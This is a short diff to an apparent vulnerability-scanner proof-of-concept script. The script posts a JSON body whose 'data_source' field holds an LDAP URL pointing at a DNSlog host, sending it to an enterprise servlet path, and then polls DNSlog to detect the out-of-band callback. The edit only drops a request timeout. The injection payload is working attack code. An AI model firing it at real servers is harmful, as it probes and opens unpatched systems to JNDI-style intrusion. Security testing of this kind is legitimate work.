@@ -51,7 +51,7 @@ class poc:
             dnslog = dnslog_all[0]
             url = "{}://{}/service/~pim/PMCloudDriveProjectStateServlet".format(scheme, netloc)
             data = '{"data_source": "ldap://' + dnslog + '","user": ""}'
-            result = requests.post(url=url, data=data, headers=self.headers, verify=False, timeout=3, proxies=self.proxies)
+            result = requests.post(url=url, data=data, headers=self.headers, verify=False, proxies=self.proxies)
             for i in range(5):
                 dnslog_result = dnslogs(self.proxies).get_result(dnslog_all[1])
             if dnslog_result != "[]":
